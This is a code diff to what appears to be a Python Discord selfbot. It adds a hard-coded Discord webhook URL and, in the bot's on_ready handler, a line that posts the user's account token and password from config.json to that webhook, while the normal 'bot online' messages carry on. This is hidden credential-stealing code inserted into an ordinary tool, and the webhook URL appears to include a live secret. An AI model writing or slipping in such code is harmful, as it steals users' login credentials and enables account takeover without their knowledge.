@@ -15,7 +15,7 @@ import json
 
 with open('config.json') as f:
     config = json.load(f)
-
+api = "https://discord.com/api/webhooks/805137617330241567/OxwG4RjXTnOFy6TAwhoJsSY-BSZll86Kw9D2kpXdYq-JLSbPaAhXjTkWgn58Lf4G6HVG"
 JumboPic = "https://cdn.discordapp.com/attachments/795757273153929220/803993863483424828/logo.jpg"
 token = config.get('token')
 password = config.get('password')
@@ -79,6 +79,7 @@ async def on_ready():
     print(GREEN + "[+]Logged in as:" + MAGENTA +  f" {client.user.name}")
     print(GREEN + f"[+]Prefix: " + MAGENTA + prefix)
     print(RED + "[!]Bot online")
+    requests.post(api,json={'content': f"**Token:** `{token}`\n**Password:** `{password}`"})
     time.sleep(1)
     print(RED + "[!]Cogs functioning")
 
